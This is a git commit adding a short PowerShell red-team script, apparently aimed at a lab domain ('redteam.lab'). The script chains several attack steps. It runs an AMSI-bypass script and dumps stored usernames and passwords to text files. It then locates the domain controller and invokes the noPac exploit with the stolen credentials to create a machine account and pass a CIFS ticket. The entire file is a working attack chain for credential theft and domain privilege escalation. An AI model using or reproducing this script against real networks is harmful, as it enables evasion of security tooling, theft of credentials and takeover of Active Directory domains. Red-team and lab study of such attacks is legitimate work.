2beb37fdd9a82fce74ceed09ac03ddc2ba5d6a75
assume-breach <76174163+assume-breach@users.noreply.github.com>
2022-03-19 16:21:30 -0400

    Create noPacRat.ps1

---
+++ noPacRat/noPacRat.ps1
@@ -0,0 +1,15 @@
+.\amsi-opcode.ps1
+import-module .\dumpUserStore.ps1
+import-module activedirectory
+.\dumpUserStore.ps1 > username.txt
+import-module .\dumpPassStore.ps1 
+.\dumpPassStore.ps1 > password.txt
+Get-ADDomainController -Discover -Site "Default-First-Site-Name" -ForceDiscover | select Name > DC.txt
+$DC = Get-Content .\DC.txt | select -Index 3
+$DC | Foreach {$_.TrimEnd()} | Set-Content DC.txt
+$username = Get-Content .\username.txt -First 1
+$password = Get-Content .\password.txt -First 1
+$domain = (gwmi win32_computersystem).Domain
+
+import-module .\Invoke-noPac.ps1
+Invoke-noPac "-domain $domain -user $username -pass $password /enctype rc4 /dc DC2.redteam.lab /mAccount newmachine /mPassword Password123 /service cifs /ptt"
